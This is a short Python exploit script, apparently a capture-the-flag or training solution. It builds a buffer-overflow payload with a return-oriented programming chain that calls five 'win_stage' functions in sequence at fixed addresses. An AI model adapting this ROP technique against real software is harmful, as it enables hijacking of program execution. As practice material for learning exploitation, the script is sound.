#!/usr/bin/env python3

from struct import pack


payload = b'a' * 120
payload += pack("<Q", 0x401823) # pop rdi ; ret
payload += pack("<Q", 0x1)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x401430) # win_stage_1

payload += pack("<Q", 0x401823) # pop rdi ; ret
payload += pack("<Q", 0x2)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x40156a) # win_stage_2

payload += pack("<Q", 0x401823) # pop rdi ; ret
payload += pack("<Q", 0x3)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x4016a4) # win_stage_3

payload += pack("<Q", 0x401823) # pop rdi ; ret
payload += pack("<Q", 0x4)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x4014cd) # win_stage_4

payload += pack("<Q", 0x401823) # pop rdi ; ret
payload += pack("<Q", 0x5)      # Add value to the stack which will be used as an argument.
payload += pack("<Q", 0x401607) # win_stage_5

with open("payload", "wb") as f:
    f.write(payload)
